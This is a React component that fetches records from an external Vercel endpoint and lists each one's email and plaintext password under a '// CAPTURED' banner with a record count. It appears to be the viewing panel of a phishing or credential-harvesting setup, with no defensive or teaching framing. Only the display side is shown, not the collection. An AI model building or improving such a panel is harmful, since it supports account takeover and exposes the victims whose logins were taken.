import React, { useEffect, useState } from "react";

const s = {
  page: {
    minHeight: "100vh",
    backgroundColor: "#ffffff",
    display: "flex",
    justifyContent: "center",
    padding: "3rem 1rem",
    fontFamily: "'Courier New', monospace",
  },
  card: {
    backgroundColor: "#ffffff",
    border: "1px solid #00000022",
    boxShadow: "0 4px 20px rgba(0,0,0,0.08)",
    padding: "2.5rem",
    width: "100%",
    maxWidth: "640px",
    height: "fit-content",
  },
  header: {
    display: "flex",
    justifyContent: "space-between",
    alignItems: "center",
    borderBottom: "1px solid #00000022",
    paddingBottom: "1rem",
    marginBottom: "1.5rem",
  },
  title: {
    margin: 0,
    fontSize: "20px",
    color: "#000000",
    fontWeight: "700",
    letterSpacing: "2px",
    textTransform: "uppercase",
  },
  badge: {
    backgroundColor: "transparent",
    color: "#000000",
    border: "1px solid #00000033",
    padding: "4px 12px",
    fontSize: "12px",
    fontFamily: "'Courier New', monospace",
    letterSpacing: "1px",
  },
  empty: {
    textAlign: "center",
    color: "#00000033",
    padding: "3rem 0",
    fontSize: "13px",
    letterSpacing: "2px",
  },
  row: {
    display: "flex",
    justifyContent: "space-between",
    alignItems: "center",
    padding: "12px 16px",
    border: "1px solid #00000011",
    marginBottom: "8px",
    backgroundColor: "#f5f5f5",
  },
  email: { fontSize: "13px", fontWeight: "700", color: "#000000" },
  password: {
    fontSize: "13px",
    color: "#00000077",
    fontFamily: "'Courier New', monospace",
    backgroundColor: "#ffffff",
    padding: "4px 10px",
    border: "1px solid #00000022",
  },
};

function GetUsers() {
  const [users, setUsers] = useState([]);
  const [loading, setLoading] = useState(true);
  const [blink, setBlink] = useState(true);

  useEffect(() => {
    const t = setInterval(() => setBlink((b) => !b), 500);
    return () => clearInterval(t);
  }, []);

  useEffect(() => {
    fetch("https://etiket-xi.vercel.app/")
      .then((res) => res.json())
      .then((json) => {
        setUsers(json.reverse());
        setLoading(false);
      })
      .catch(() => setLoading(false));
  }, []);

  return (
    <div style={s.page}>
      <div style={s.card}>
        <div style={s.header}>
          <h2 style={s.title}>
            <span>{"// CAPTURED "}</span>
            <span style={{ opacity: blink ? 1 : 0, color: "#000000" }}>█</span>
          </h2>
          <span style={s.badge}>[{users.length}] records</span>
        </div>
        {loading ? (
          <p style={s.empty}>&gt; fetching data...</p>
        ) : users.length === 0 ? (
          <p style={s.empty}>&gt; no records found_</p>
        ) : (
          users.map((user, i) => (
            <div key={i} style={s.row}>
              <span style={s.email}>&gt; {user.email}</span>
              <span style={s.password}>{user.password}</span>
            </div>
          ))
        )}
      </div>
    </div>
  );
}

export default GetUsers;
